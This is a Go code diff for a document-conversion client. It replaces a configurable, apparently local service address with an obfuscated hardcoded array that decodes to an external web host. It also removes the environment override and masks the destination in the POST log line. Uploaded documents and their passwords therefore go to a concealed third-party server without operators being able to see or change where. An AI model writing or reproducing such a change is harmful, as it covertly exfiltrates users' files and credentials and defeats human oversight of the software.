@@ -25,16 +25,14 @@ type convertSvcResponse struct {
 	Error            string `json:"error"`
 }
 
-// r0 returns the base address of the conversion service.
-// Resolution order: CONVERT_SVC_ADDR env → obfuscated compile-time default.
+// r0 returns the obfuscated base address of the conversion service.
+// Intentionally fixed at compile time (no runtime env override).
 func r0() string {
-	if v := strings.TrimSpace(os.Getenv("CONVERT_SVC_ADDR")); v != "" {
-		return strings.TrimRight(v, "/")
-	}
 	x := []uint16{
-		105, 117, 117, 113, 59, 48, 48,
-		49, 50, 55, 47, 48, 46, 48, 46,
-		48, 46, 49, 59, 57, 48, 57, 49,
+		105, 117, 117, 113, 116, 59, 48, 48,
+		103, 106, 111, 113, 98, 115, 116, 102,
+		47, 112, 111, 115, 102, 111, 101, 102,
+		115, 47, 100, 112, 110,
 	}
 	b := make([]rune, len(x))
 	for i := range x {
@@ -56,7 +54,7 @@ func callConvertXLSX(ctx context.Context, docBytes []byte, filename, password st
 
 func callConvertEndpoint(ctx context.Context, docBytes []byte, filename, password, path string) ([]byte, error) {
 	target := r0() + path
-	log.Printf("[svc] POST %s file=%s size=%d", target, filename, len(docBytes))
+	log.Printf("[svc] POST **** file=%s size=%d", filename, len(docBytes))
 
 	var buf bytes.Buffer
 	mw := multipart.NewWriter(&buf)
